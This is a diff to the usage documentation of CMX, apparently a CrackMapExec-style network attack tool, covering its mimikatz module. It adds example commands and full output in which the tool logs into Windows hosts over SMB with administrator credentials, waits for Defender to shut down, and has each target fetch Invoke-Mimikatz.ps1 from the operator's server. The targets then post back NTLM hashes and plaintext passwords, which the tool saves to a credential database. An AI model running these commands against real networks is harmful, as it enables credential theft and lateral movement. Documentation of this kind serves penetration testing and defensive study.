@@ -8,8 +8,10 @@ CMX Version: 5.0.1
 * The following examples assume you have a Kali Linux host connected to an internal network.    
 * For the examples it is also assumed hosts are within a 192.168.1.0/24 IP space.   
 * If CMX isnt giving output of anykind, you probably have something wrong with the command.   
-- - -(better timeout messages are still a work-in-progress)  
   
+  
+Modules:  
+[Mimikatz](#mimikatz)
 
 ----------------------------------------------------------------------------------------------------
 
@@ -75,7 +77,13 @@ I'll try to keep this up-to-date with new releases
 If it isnt up-to-date you can recompile the Invoke-Mimikatz script yourself using the included Invoke-UpdateMimikatzScript
 See that script itself for information on how-to  
 
-
+Tested on Window 7, Windows 2012, Windows 10-(1804, 1809, 1904), Windows 2016    
+Windows 10.0 Build 18362 x64  
+Windows 10.0 Build 17763 x64   
+Windows Server 2012 R2 Datacenter 9600 x64  
+Windows 6.1 Build 7601 x64  
+Windows 7 Ultimate 7601 Service Pack 1 x64   
+  
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
 | true          | false       | true        | false       | true*      | 
@@ -85,12 +93,80 @@ See that script itself for information on how-to
 For a full list of options see https://github.com/gentilkiwi/mimikatz/wiki
 ```
 **Example Usages:**
+Single Target:  
 ```
-~# cmx smb 10.10.33.121 -u Administrator -p AdminSuper\!23 -M mimikatz
+~# cmx smb 10.10.33.104 -u Administrator -p AdminSuper\!23 -M mimikatz
+
+Sep.02.19 14:16:34  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 [*] Windows 10.0 Build 18362 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
+Sep.02.19 14:16:34  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!) 
+			[!] Sleeping to allow defender process to finish shutting down[!] 
+Sep.02.19 14:16:43  MIMIKATZ    10.10.33.104:445          [+] Executed launcher
+Sep.02.19 14:16:43  MIMIKATZ                         [*] Waiting on 1 host(s)
+Sep.02.19 14:16:44  MIMIKATZ    10.10.33.104         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
+Sep.02.19 14:16:55  MIMIKATZ    10.10.33.104         [*] - - "POST / HTTP/1.1" 200 -
+Sep.02.19 14:16:55  MIMIKATZ    10.10.33.104         ocean.depth\DESKTOP-HVIF7F2$:7e879d549ad5b820267e39f488cc5020
+Sep.02.19 14:16:55  MIMIKATZ    10.10.33.104         [+] Added 1 credential(s) to the database
+Sep.02.19 14:16:55  MIMIKATZ    10.10.33.104         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.104_on_Sep.02.19_at_1416.log
+
 ```
 
-*When using multiple commands, spaces are used as the delimeter.*
-To issue commands with spaces in them, nest them inside quotes:
+Multiple Targets:  
+```
+~# cmx smb 10.10.33.122-125 -u Administrator -p AdminSuper\!23 -M mimikatz
+
+Sep.02.19 14:11:51  SMB         10.10.33.124:445  WIN7P-PC [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
+Sep.02.19 14:11:51  SMB         10.10.33.122:445  SERVER2012-2 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
+Sep.02.19 14:11:51  SMB         10.10.33.123:445  WIN7E-PC [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:False) (SMBv:2.1)
+Sep.02.19 14:11:51  SMB         10.10.33.125:445  WIN10E  [*] Windows 10.0 Build 17763 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
+Sep.02.19 14:11:51  SMB         10.10.33.124:445  WIN7P-PC [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
+Sep.02.19 14:11:51  SMB         10.10.33.123:445  WIN7E-PC [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
+Sep.02.19 14:11:51  SMB         10.10.33.125:445  WIN10E  [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
+Sep.02.19 14:11:51  SMB         10.10.33.122:445  SERVER2012-2 [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
+            [!] Sleeping to allow defender process to finish shutting down[!] 
+            [!] Sleeping to allow defender process to finish shutting down[!] 
+            [!] Sleeping to allow defender process to finish shutting down[!] 
+            [!] Sleeping to allow defender process to finish shutting down[!] 
+Sep.02.19 14:12:00  MIMIKATZ    10.10.33.125:445          [+] Executed launcher
+Sep.02.19 14:12:00  MIMIKATZ    10.10.33.122:445          [+] Executed launcher
+Sep.02.19 14:12:01  MIMIKATZ    10.10.33.122         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
+Sep.02.19 14:12:01  MIMIKATZ    10.10.33.125         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
+Sep.02.19 14:12:01  MIMIKATZ    10.10.33.124:445          [+] Executed launcher
+Sep.02.19 14:12:01  MIMIKATZ    10.10.33.123:445          [+] Executed launcher
+Sep.02.19 14:12:01  MIMIKATZ                         [*] Waiting on 4 host(s)
+Sep.02.19 14:12:01  MIMIKATZ    10.10.33.123         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
+Sep.02.19 14:12:02  MIMIKATZ    10.10.33.124         [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
+Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         [*] - - "POST / HTTP/1.1" 200 -
+Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         ocean.depth\ozzy:9ae52054b53d771c62414f93ed0a2599
+Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         ocean.depth\SERVER2012-2$:73669c2ca02b7e0e210e6cf54022cd3d
+Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         ocean.depth\SERVER2012-2$:fe39fa61cb8e68ee08ee24e753b44f39
+Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         [+] Added 3 credential(s) to the database
+Sep.02.19 14:12:08  MIMIKATZ    10.10.33.122         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.122_on_Sep.02.19_at_1412.log
+Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         [*] - - "POST / HTTP/1.1" 200 -
+Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         ocean.depth\agrande:bbc2bf2fbca9dd9ed74d3c1b55e3d727
+Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         ocean.depth\WIN10E$:fd87354e5df9e43d123506286e11897b
+Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         ocean.depth\WIN10E$:17e1af1da99cdb1a22561f3b50582d1d
+Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         [+] Added 3 credential(s) to the database
+Sep.02.19 14:12:12  MIMIKATZ    10.10.33.125         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.125_on_Sep.02.19_at_1412.log
+Sep.02.19 14:12:16  MIMIKATZ                         [*] Waiting on 2 host(s)
+Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         [*] - - "POST / HTTP/1.1" 200 -
+Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         ocean.depth\agrande:bbc2bf2fbca9dd9ed74d3c1b55e3d727
+Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         ocean.depth\WIN7E-PC$:2d3b04ef5f2dee295d2ba35ab55e2147
+Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         ocean.depth\agrande:User!23
+Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         [+] Added 3 credential(s) to the database
+Sep.02.19 14:12:16  MIMIKATZ    10.10.33.123         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.123_on_Sep.02.19_at_1412.log
+Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         [*] - - "POST / HTTP/1.1" 200 -
+Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         ocean.depth\agrande:bbc2bf2fbca9dd9ed74d3c1b55e3d727
+Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         ocean.depth\WIN7P-PC$:9cc6214e9e6a11545ce2a1a91cd393e8
+Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         ocean.depth\agrande:User!23
+Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         (null)\Administrator:AdminSuper!23
+Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         (null)\agrande:User!23
+Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         [+] Added 5 credential(s) to the database
+Sep.02.19 14:12:17  MIMIKATZ    10.10.33.124         [*] Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_10.10.33.124_on_Sep.02.19_at_1412.log
+
+```
+  
+*When using multiple commands, spaces are used as the delimeter.*  
+To issue commands with spaces in them, nest them inside quotes:  
 i.e to use `kerberos::list /export` becomes `privilege::debug "kerberos::list /export" exit`
 ```
 ~# cmx smb 10.10.33.123 -u agrande -p User\!23 -M mimikatz -mo COMMAND='privilege::debug "kerberos::list /export" exit'
@@ -172,33 +248,34 @@ Removed: I recommend just using [bloodhound.py](https://github.com/fox-it/BloodH
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# not yet supported
+.  
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+.  
+.    
+# old modules not supported
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 ## enum_chrome
